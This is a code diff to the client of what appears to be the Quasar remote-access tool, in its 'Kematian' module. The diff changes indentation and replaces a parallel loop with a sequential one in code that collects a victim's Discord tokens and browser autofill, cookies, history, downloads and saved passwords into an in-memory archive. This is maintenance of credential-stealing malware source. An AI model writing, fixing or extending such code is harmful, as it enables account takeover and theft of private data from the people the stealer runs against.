@@ -25,16 +25,16 @@ namespace Quasar.Client.Kematian
 
                     var methods = new KeyValuePair<Func<string>, string>[]
                     {
-                            new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
+                                new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
 
-                            new KeyValuePair<Func<string>, string>(retriever.GetAutoFillData, "Browsers\\autofill.json"),
-                            new KeyValuePair<Func<string>, string>(retriever.GetCookies, "Browsers\\cookies_netscape.txt"),
-                            new KeyValuePair<Func<string>, string>(retriever.GetDownloads, "Browsers\\downloads.json"),
-                            new KeyValuePair<Func<string>, string>(retriever.GetHistory, "Browsers\\history.json"),
-                            new KeyValuePair<Func<string>, string>(retriever.GetPasswords, "Browsers\\passwords.json"),
+                                new KeyValuePair<Func<string>, string>(retriever.GetAutoFillData, "Browsers\\autofill.json"),
+                                new KeyValuePair<Func<string>, string>(retriever.GetCookies, "Browsers\\cookies_netscape.txt"),
+                                new KeyValuePair<Func<string>, string>(retriever.GetDownloads, "Browsers\\downloads.json"),
+                                new KeyValuePair<Func<string>, string>(retriever.GetHistory, "Browsers\\history.json"),
+                                new KeyValuePair<Func<string>, string>(retriever.GetPasswords, "Browsers\\passwords.json"),
                     };
 
-                    Parallel.ForEach(methods, methodPair =>
+                    foreach (var methodPair in methods)
                     {
                         try
                         {
@@ -50,7 +50,7 @@ namespace Quasar.Client.Kematian
                         {
                             Debug.WriteLine($"Error processing {methodPair.Value}: {ex.Message}");
                         }
-                    });
+                    }
                 }
                 data = memoryStream.ToArray();
             }
